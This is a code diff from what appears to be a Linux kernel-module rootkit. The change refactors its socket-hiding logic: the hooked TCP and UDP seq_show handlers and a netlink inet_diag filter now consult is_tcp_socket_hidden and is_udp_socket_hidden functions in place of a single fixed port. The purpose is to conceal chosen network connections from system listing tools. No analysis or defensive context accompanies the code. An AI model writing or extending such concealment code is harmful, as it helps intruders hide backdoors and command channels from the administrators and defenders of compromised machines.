@@ -7,6 +7,7 @@
 #include <net/udp.h>
 #include <linux/inet_diag.h>
 
+#include "control.h"
 #include "include.h"
 #include "main.h"
 
@@ -26,10 +27,6 @@ static int recvmsg_call_counter = 0;
 static int tcp_show_call_counter = 0;
 static int udp_show_call_counter = 0;
 
-/* the parameters specifying which socket to hide */
-static char *tlp_version;
-static int port_number;
-
 
 /*
  * check if we need to hide this socket.
@@ -40,7 +37,7 @@ static int hide(struct nlmsghdr *nlh)
 	struct inet_diag_msg *r = NLMSG_DATA(nlh);
 	int port = ntohs(r->id.idiag_sport);
 	
-	if(port == port_number && strcmp(tlp_version, "tcp") == 0)
+	if(is_tcp_socket_hidden(port))
 	{
 		return 1;
 	}
@@ -74,7 +71,8 @@ static int manipulated_tcp_show(struct seq_file* m, void *v)
 	port = ntohs(inet->inet_sport);
 
 	/* check protocol and port */
-	if(port == port_number && strcmp(tlp_version, "tcp") == 0)
+	//if(port == port_number && strcmp(tlp_version, "tcp") == 0)
+	if(is_tcp_socket_hidden(port))
 	{
 		/* reduce our counter */
 		tcp_show_call_counter--;
@@ -111,7 +109,8 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
 	port = ntohs(inet->inet_sport);
 
 	/* check protocol and port */
-	if(port == port_number && strcmp(tlp_version, "udp") == 0)
+	//if(port == port_number && strcmp(tlp_version, "udp") == 0)
+	if(is_udp_socket_hidden(port))
 	{
 		/* reduce our counter */
 		udp_show_call_counter--;
